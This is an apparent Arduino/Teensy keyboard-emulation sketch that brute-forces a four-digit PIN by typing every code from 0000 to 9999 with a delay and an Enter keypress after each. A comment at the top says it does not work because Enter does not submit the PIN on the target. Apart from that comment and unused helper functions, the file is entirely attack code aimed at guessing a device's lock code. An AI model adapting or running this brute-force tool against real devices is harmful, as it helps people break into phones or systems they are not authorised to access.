//enter key do no allow to validate a pin, so this is not working

void pT(char* password)
{
  delay(150);
  int j;
  for (j = 0 ; j < strlen(password) ; j++)
  {
    Keyboard.print(password[j]);
    delay(100);
  }
  delay(150);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  
  Keyboard.set_key1(0);
  Keyboard.send_now();

  delay(150);
}

void enterKey()
{
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
          
  Keyboard.set_key1(0);
  Keyboard.send_now();  
}

void getFocus()
{
  int i;
  for (i=0; i<10;i++)
  {
    Keyboard.set_key1(KEY_TAB );
    Keyboard.send_now();
            
    Keyboard.set_key1(0);
    Keyboard.send_now(); 
  }
}

void setup() {
  delay(1000);
}

void loop() {
delay(500);
int i;
int j;
int k;
int l;

int keepalive;

String pincodeString;
char pincodeChar[5];

for (i=0 ; i<10; i++)
  for (j=0; j<10; j++)
    for (k=0; k<10; k++)
      for (l=0; l<10; l++)
      {
        pincodeString = String(i) + String(j) + String(k) + String(l);
        pincodeString.toCharArray(pincodeChar, 5);
        pT(pincodeChar);
      }
while(1){}

}
